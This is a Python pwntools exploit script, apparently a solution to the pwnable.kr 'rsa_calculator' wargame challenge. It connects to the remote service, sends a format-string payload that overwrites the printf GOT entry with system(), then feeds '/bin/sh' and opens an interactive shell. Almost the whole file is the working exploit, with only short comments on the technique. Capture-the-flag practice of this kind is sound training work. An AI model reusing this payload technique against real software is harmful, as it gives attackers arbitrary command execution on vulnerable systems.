from pwn import *

import binascii
import struct

def encode(b):
    return ''.join(binascii.hexlify(struct.pack("<I", ord(c))) for c in b)

conn = remote("pwnable.kr", 9012)
# conn = process("./rsa_calculator")
# gdb.attach(conn, """b *0x401403
# b *0x4010ff""")

# Set RSA paramters
conn.sendline("1")
conn.sendline("17")
conn.sendline("19")
conn.sendline("1")
conn.sendline("1")

# Get system
PRINTF_ADDR = 0x602028

conn.sendline("3")
conn.sendline("1024")

# Format string bug - we can use it to override the `printf()` `got` entry and point it to `system()`.
# The 'A' padding is so we can get a place on the stack that has nulls - might wanna play with that one...
conn.sendline(encode("%34$n%4196294x%33$n") + 16*'A' + p64(PRINTF_ADDR) + p64(PRINTF_ADDR + 4))

conn.recvuntil("- decrypted result -\n")
data = conn.recvline()

conn.sendline("3")
conn.sendline("1024")
conn.sendline(encode("/bin/sh\x00"))
conn.recvuntil("- decrypted result -\n")

conn.interactive()
